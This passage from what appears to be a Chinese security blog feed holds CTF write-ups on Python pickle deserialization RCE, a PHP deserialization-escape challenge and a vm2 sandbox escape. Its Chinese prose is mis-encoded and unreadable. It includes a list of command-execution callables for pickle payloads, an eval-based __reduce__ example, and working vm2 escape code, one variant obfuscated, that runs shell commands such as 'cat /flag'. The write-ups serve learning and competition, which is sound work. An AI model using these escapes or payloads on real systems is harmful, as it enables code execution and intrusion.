<h2 id="dumps"><a href="#dumps" class="headerlink" title="dumps"></a>dumps</h2><p>è¯¥å‡½æ•°ä¸dumpçš„å·®åˆ«åœ¨äºè¯¥å‡½æ•°ä¸ä¼šå°†å¯¹è±¡å†™å…¥æ–‡ä»¶å½“ä¸­ï¼Œåªä¼šå°†å…¶è½¬åŒ–ä¸ºbyteså¯¹è±¡ï¼Œä¾‹å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n, a</span>):</span></span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(self.name + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aa = Person(<span class="string">&quot;JGood&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># f=open(&#x27;p.txt&#x27;,&#x27;wb&#x27;)</span></span><br><span class="line">c = pickle.dumps(aa,<span class="number">0</span>)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nPerson\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVJGood\np7\nsVage\np8\nI2\nsb.&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="load"><a href="#load" class="headerlink" title="load"></a>load</h2><p>loadä¸dumpå¯¹åº”ï¼Œè¯»å–æŸä¸ªæ–‡ä»¶å¹¶å°†å…¶è¿˜åŸä¸ºä¸€ä¸ªç±»ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pickle.loadï¼ˆfileï¼Œ*ï¼Œfix_imports &#x3D; Trueï¼Œencoding &#x3D;â€œASCIIâ€ï¼Œerrors &#x3D;â€œstrictâ€ ï¼‰</span><br><span class="line">ä»æ‰“å¼€çš„æ–‡ä»¶å¯¹è±¡ æ–‡ä»¶ä¸­è¯»å–pickleå¯¹è±¡è¡¨ç¤ºï¼Œå¹¶è¿”å›å…¶ä¸­æŒ‡å®šçš„é‡æ„å¯¹è±¡å±‚æ¬¡ç»“æ„ã€‚è¿™ç›¸å½“äºUnpickler(file).load()ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="loads"><a href="#loads" class="headerlink" title="loads"></a>loads</h2><p>loadsä¸dumpså¯¹åº”ï¼Œå°†ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡æ¢æˆä¸€ä¸ªç±»ã€‚ </p>
<p>åœ¨å¤§éƒ¨åˆ†çš„æ¯”èµ›å½“ä¸­ï¼Œæˆ‘ä»¬é‡è§çš„æƒ…å†µéƒ½æ˜¯é¢˜ç›®ä¼šloadå¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾çš„å°±æ˜¯é­”æ³•å‡½æ•°ã€‚ååºåˆ—åŒ–æ¼æ´å‡ºç°åœ¨ <code>__reduce__()</code>é­”æ³•å‡½æ•°ä¸Šï¼Œè¿™ä¸€ç‚¹å’ŒPHPä¸­çš„<code>__wakeup()</code> é­”æœ¯æ–¹æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯å› ä¸ºæ¯å½“ååºåˆ—åŒ–è¿‡ç¨‹å¼€å§‹æˆ–è€…ç»“æŸæ—¶ , éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ç±»å‡½æ•°ã€‚è€Œè¿™æ°å¥½æ˜¯ååºåˆ—åŒ–æ¼æ´ç»å¸¸å‡ºç°çš„åœ°æ–¹ã€‚</p>
<p>è€Œä¸”åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå› ä¸ºç¼–ç¨‹è¯­è¨€éœ€è¦æ ¹æ®ååºåˆ—åŒ–å­—ç¬¦ä¸²å»è§£æå‡ºè‡ªå·±ç‹¬ç‰¹çš„è¯­è¨€æ•°æ®ç»“æ„ï¼Œæ‰€ä»¥å°±å¿…é¡»è¦åœ¨å†…éƒ¨æŠŠè§£æå‡ºæ¥çš„ç»“æ„å»æ‰§è¡Œä¸€ä¸‹ã€‚å¦‚æœåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜ï¼Œä¾¿å¯èƒ½ç›´æ¥é€ æˆRCEæ¼æ´.</p>
<p>ã€ä¸Šè¿°æ‘˜è‡ªå¸ˆå‚…çš„åšå®¢<a href="https://blog.csdn.net/qq_43431158/article/details/108919605">https://blog.csdn.net/qq_43431158/article/details/108919605</a></p>
<p>å¹¶ä¸”loadsä¼šè‡ªåŠ¨çš„è§£å†³importé—®é¢˜ï¼Œå¯¹äºæ²¡æœ‰å¼•å…¥çš„moduleä¼šè‡ªåŠ¨å°è¯•importï¼Œä¹Ÿå°±æ˜¯è¯´Pythonä¸­æ ‡å‡†åº“çš„ä»£ç æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œå‡½æ•°æˆ‘ä»¬éƒ½å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹å¯ä»¥å°è¯•ä½¿ç”¨çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval, execfile, compile, open, file, map, input,</span><br><span class="line">os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,</span><br><span class="line">os.listdir, os.access,</span><br><span class="line">os.execl, os.execle, os.execlp, os.execlpe, os.execv,</span><br><span class="line">os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,</span><br><span class="line">os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,</span><br><span class="line">pickle.load, pickle.loads,cPickle.load,cPickle.loads,</span><br><span class="line">subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,</span><br><span class="line">commands.getstatusoutput,commands.getoutput,commands.getstatus,</span><br><span class="line">glob.glob,</span><br><span class="line">linecache.getline,</span><br><span class="line">shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,</span><br><span class="line">dircache.listdir,dircache.opendir,</span><br><span class="line">io.open,</span><br><span class="line">popen2.popen2,popen2.popen3,popen2.popen4,</span><br><span class="line">timeit.timeit,timeit.repeat,</span><br><span class="line">sys.call_tracing,</span><br><span class="line">code.interact,code.compile_command,codeop.compile_command,</span><br><span class="line">pty.spawn,</span><br><span class="line">posixfile.open,posixfile.fileopen,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure>



<p>å½“ <code>__reduce__()</code> å‡½æ•°è¿”å›ä¸€ä¸ªå…ƒç»„æ—¶ , <strong>ç¬¬ä¸€ä¸ªå…ƒç´ </strong>æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ , è¿™ä¸ªå¯¹è±¡ä¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶è¢«è°ƒç”¨ . <strong>ç¬¬äºŒä¸ªå…ƒç´ </strong>æ˜¯å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•° , åŒæ ·æ˜¯ä¸€ä¸ªå…ƒç»„ã€‚</p>
<p>ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    print(<span class="string">&quot;wdnmd&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>, (<span class="string">&quot;print(123213)&quot;</span>,)</span><br><span class="line">person = Person()</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(person,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">wdnmd</span></span><br><span class="line"><span class="string">cc</span></span><br><span class="line"><span class="string">b&#x27;c__builtin__\neval\np0\n(Vprint(123213)\np1\ntp2\nRp3\n.&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ç»“æŸçš„æ—¶å€™ , Python è¿›ç¨‹ä¼šè‡ªåŠ¨è°ƒç”¨ <code>__reduce__()</code> é­”æœ¯æ–¹æ³• . å¦‚æœå¯ä»¥æ§åˆ¶è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•° , Python è¿›ç¨‹å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p>
<p><strong>ä½†æ˜¯åœ¨æˆ‘è‡ªå·±è¯•çš„æ—¶å€™ï¼Œå‘ç°å³ä½¿æ˜¯dumpsä¹Ÿä¼šæ‰§è¡Œæˆ‘ä»¬çš„è¯­å¥</strong></p>
<p>å›åˆ°loadsæ¥è¯´ï¼Œloadsä¹Ÿå¯ä»¥ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé™¤äº†ikuné‚£é“é¢˜ç›®å¤§éƒ¨åˆ†payloadä½¿ç”¨evalä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨</p>
<p>Python2ä¸­åŒ…å«çš„commands.getoutput(),åœ¨Ikunè¿™é“é¢˜å½“ä¸­ï¼š</p>
<p><img src="image-20201207205603107.png" alt="image-20201207205603107"></p>
<p>å¯æƒœè¿™é‡Œåªæ˜¯Python2ç¯å¢ƒï¼Œå¦‚æœåœ¨Python3ç¯å¢ƒå½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨subprocess</p>
<h4 id="1-call"><a href="#1-call" class="headerlink" title="(1) call"></a>(1) call</h4><p>æ‰§è¡Œå‘½ä»¤ï¼Œè¿”å›çŠ¶æ€ç (å‘½ä»¤æ­£å¸¸æ‰§è¡Œè¿”å›0ï¼ŒæŠ¥é”™åˆ™è¿”å›1)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ret1&#x3D;subprocess.call(&quot;ifconfig&quot;)</span><br><span class="line">ret2&#x3D;subprocess.call(&quot;ipconfig&quot;)ã€€ã€€ã€€ã€€#python3.5ä¸æ˜¯è¿™æ ·ï¼Œä¾ç„¶ä¼šæŠ›å‡ºå¼‚å¸¸å¯¼è‡´æ— æ³•å¯¹ret2èµ‹å€¼</span><br><span class="line">print(ret1)     #0</span><br><span class="line">print(ret2)     #1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret &#x3D; subprocess.call([&quot;ls&quot;, &quot;-l&quot;], shell&#x3D;False)    #shellä¸ºFalseçš„æ—¶å€™å‘½ä»¤å¿…é¡»åˆ†å¼€å†™</span><br><span class="line">ret &#x3D; subprocess.call(&quot;ls -l&quot;, shell&#x3D;True)</span><br></pre></td></tr></table></figure>

<h4 id="2-check-call"><a href="#2-check-call" class="headerlink" title="(2) check_call"></a>(2) check_call</h4><p>æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœæ‰§è¡ŒæˆåŠŸåˆ™è¿”å›çŠ¶æ€ç 0ï¼Œå¦åˆ™æŠ›å¼‚å¸¸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">subprocess.check_call([&quot;ls&quot;, &quot;-l&quot;])</span><br><span class="line">subprocess.check_call(&quot;exit 1&quot;, shell&#x3D;True)</span><br></pre></td></tr></table></figure>

<h4 id="3-check-output"><a href="#3-check-output" class="headerlink" title="(3) check_output"></a>(3) check_output</h4><p>æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœæ‰§è¡ŒæˆåŠŸåˆ™è¿”å›æ‰§è¡Œç»“æœï¼Œå¦åˆ™æŠ›å¼‚å¸¸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">subprocess.check_output([&quot;echo&quot;, &quot;Hello World!&quot;])</span><br><span class="line">subprocess.check_output(&quot;exit 1&quot;, shell&#x3D;True)</span><br></pre></td></tr></table></figure>

<h4 id="4-subprocess-Popen-â€¦"><a href="#4-subprocess-Popen-â€¦" class="headerlink" title="(4) subprocess.Popen(â€¦)"></a>(4) subprocess.Popen(â€¦)</h4>]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF_EASYPHP</title>
    <url>/2020/12/11/GYCTF-EASYPHP/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>ååºåˆ—åŒ–é€ƒé€¸</li>
<li>POPé“¾</li>
</ul>
<h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>é¢˜ç›®å¯ä»¥dumpä¸‹æ¥wwwä¸‹çš„PHPæ–‡ä»¶ï¼Œåœ¨update.phpä¸‹é¢ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å³ä½¿ç™»é™†æ²¡æœ‰æˆåŠŸä¹Ÿæ‰§è¡Œäº†update()è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥è¦è¯´æ¼æ´è‚¯å®šå°±æ˜¯åœ¨è¿™é‡Œäº†ï¼Œé‡ç‚¹åœ¨lib.phpè¿™é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°è¯•checkè¿™å„¿ï¼Œå…ˆçœ‹updateå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çœ‹è¿™é‡Œååºåˆ—åŒ–äº†getNewInfoå‡½æ•°ï¼ŒæŸ¥çœ‹è¿™ä¸ªå‡½æ•°è·Ÿè¿›</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥æ”¶äº†ä¸¤ä¸ªå‚æ•°ï¼Œä¹‹åè°ƒç”¨safeå‡½æ•°ï¼Œå¹¶ä¸”åºåˆ—åŒ–äº†å®ƒï¼Œé‚£ä¹ˆå»æ‰¾safeå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°†ä¸æ»¡6çš„ä¸œè¥¿å˜æˆäº†hackï¼Œæœ‰é—®é¢˜ï¼Œè¿™é‡Œå¯ä»¥é€ æˆååºåˆ—åŒ–é€ƒé€¸ã€‚è¿™æ˜¯ä¸€ä¸ªæ­£å¸¸çš„æ›´æ–°æµç¨‹ï¼Œä½†å¾ˆæ˜æ˜¾æˆ‘ä»¬ä¸åº”è¯¥è·Ÿç€ä»–çš„æ€è·¯å»èµ°ï¼Œå› ä¸ºæœ‰äº†ååºåˆ—åŒ–é€ƒé€¸ï¼Œ<strong>æ‰€ä»¥nicknameæˆ‘ä»¬å¯ä»¥ä»»æ„æ§åˆ¶</strong>ï¼Œ</p>
<p>æˆ‘ä»¬åœ¨getNewInfoè¿™é‡Œå¯ä»¥çœ‹è§newäº†ä¸€ä¸ªinfoç±»ï¼ŒinFoç±»è¿™é‡Œå¾ˆæ˜æ˜¾é™¤äº†__constructä¹‹å¤–è¿˜æœ‰æœ‰ä¸ªcallã€‚é‚£ä¹ˆé¢˜ç›®åº”è¯¥æ˜¯æƒ³è®©æˆ‘ä»¬æ§åˆ¶ä»»æ„çš„sqlè¯­å¥æŸ¥è¯¢-&gt;å¾—åˆ°ä¸€ä¸ªæ’ä¸ºçœŸçš„ç»“æœ-&gt;ç™»é™†æˆåŠŸã€‚</p>
<p>å›åˆ°é¢˜ç›®è¿™é‡Œçš„æƒ…å†µè®¾æƒ³ä¸‹ï¼Œæ— è®ºç™»é™†æˆåŠŸä¸å¦ï¼Œéƒ½ä¼šå°è¯•æ‰§è¡Œupdateå‡½æ•°ï¼Œupdateå‡½æ•°è¿™é‡Œnewäº†UpdateHelperç±»ï¼Œåœ¨ç±»è¢«é”€æ¯çš„æ—¶å€™è¾“å‡ºäº†$this-&gt;sql</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>HFCTF2020JustEscape</title>
    <url>/2020/12/17/HFCTF2020JustEscape/</url>
    <content><![CDATA[<p>ä¸€é“VM2çš„æ²™ç®±é€ƒé€¸..</p>
<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>æ²™ç®±é€ƒé€¸</li>
<li>Payloadæ‹¼æ¥(?)</li>
</ul>
<h1 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h1><p>è¿™é“é¢˜ç›®ä¼ªè£…æˆPHPæ˜¯çœŸæ»´æ¶å¿ƒï¼Œé¦–å…ˆæˆ‘ä»¬è®¿é—®å¯ä»¥å¾—åˆ°ä¸€ä¸ªç”¨Vueæ¡†æ¶å†™çš„é¡µé¢ï¼š</p>
<p><img src="image-20201217143745895.png" alt="image-20201217143745895"></p>
<p>å°è¯•ç›´æ¥è®¿é—®index.phpçš„è¯å¯ä»¥å¾—åˆ°ä¸€æ®µphpæºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;code&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;code&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»“æœä½ å°±ä¼šå‘ç°è¿™ä¸ªcodeæ˜¯æ²¡åŠ $ç¬¦å·çš„ä¹Ÿå°±æ˜¯è¯´ä»–æ²¡ç”¨..é‚£ä¹ˆå†å›åˆ°ä¹‹å‰çš„codeçš„éƒ¨åˆ†ï¼Œå¤§æ¦‚ä¹Ÿæ˜¯çœŸçš„evaläº†è¿™æ®µä»£ç ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯Javascript</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?code=<span class="built_in">Error</span>().stack</span><br></pre></td></tr></table></figure>



<p><img src="image-20201217144354519.png" alt="image-20201217144354519"></p>
<p>æœç„¶æ˜¯JSï¼Œè€Œä¸”æˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜¯VM2çš„æ²™ç®±ï¼Œé‚£ä¹ˆå¦‚ä½•æ²™ç®±é€ƒé€¸å‘¢ï¼ŸğŸ‘´ä¸€ç‚¹JSä¹Ÿä¸æ‡‚ï¼Œæ²¡æ³•å­åªèƒ½å»GITHUBä¸Šå«–ï¼Œæ‰¾åˆ°ï¼š</p>
<p><a href="https://github.com/patriksimek/vm2/issues/225">vm2æ²™ç®±é€ƒé€¸</a>ï¼Œå¯ä»¥çœ‹åˆ°ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="function"><span class="title">catch</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°è¯•å¤åˆ¶ç²˜è´´ã€</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>

<p>å¥½çš„æ‰“ä¸è¿‡ï¼Œå€’åœ°åªèƒ½çœ‹WPäº†ï¼Œåˆ«äººç»™å‡ºçš„POCï¼š</p>
<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC 1"></a>POC 1</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‘ƒ..?è¿™é‡Œçœ‹èµ·æ¥æ˜¯è¿›è¡Œäº†æ‹¼æ¥ï¼Œè‡ªå·±ä¸æ‡‚åŸç†çš„è¯å°±å…ˆå­¦ä¼šæ€ä¹ˆæ‹¼æ¥payloadå§,åœ¨JSä¸­æˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·æ¥ä»£æ›¿å•å¼•å·å’ŒåŒå¼•å·ï¼š</p>
<h3 id="çš„è¯­æ³•"><a href="#çš„è¯­æ³•" class="headerlink" title="`çš„è¯­æ³•"></a>`çš„è¯­æ³•</h3><p>ES6 æ¨¡æ¿å­—ç¬¦ä¸²(Template String)æ˜¯å¢å¼ºç‰ˆçš„å­—ç¬¦ä¸²ï¼Œç”¨åå¼•å·(`)æ ‡è¯†ï¼Œå®ƒå¯ä»¥å½“ä½œæ™®é€šå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å®šä¹‰å¤šè¡Œå­—ç¬¦ä¸²ï¼Œæˆ–è€…åœ¨å­—ç¬¦ä¸²ä¸­åµŒå…¥å˜é‡ã€‚<a href="https://www.cnblogs.com/alummox/p/11343269.html">ä»‹ç»åšå®¢</a>,ä»æ­¤å¤„æˆ‘ä»¬å¯ä»¥å¾—åˆ°åå¼•å·ä½œç”¨ï¼š</p>
<ul>
<li>ä»£æ›¿å­—ç¬¦ä¸²çš„åŒå¼•å·å’Œå•å¼•å·</li>
<li>å¯ä»¥åŒ…å«ç‰¹å®šè¯­æ³•çš„å ä½ç¬¦</li>
<li>é…åˆ${}ç¬¦å·å¯ä»¥åŒ…å«å˜é‡</li>
</ul>
<p>ä¾‹å­ï¼š</p>
<p>åŸæœ¬æˆ‘ä»¬è¾“å‡ºå¤šè¡Œå­—ç¬¦ä¸²åº”è¯¥è¿™æ ·æ¥å†™ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;string text line 1\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;string text line 2&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨åå¼•å·ä¹‹å:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">`string text line 1</span></span><br><span class="line"><span class="string">string text line 2`</span>);</span><br></pre></td></tr></table></figure>

<p><img src="image-20201217151045490.png" alt="image-20201217151045490"></p>
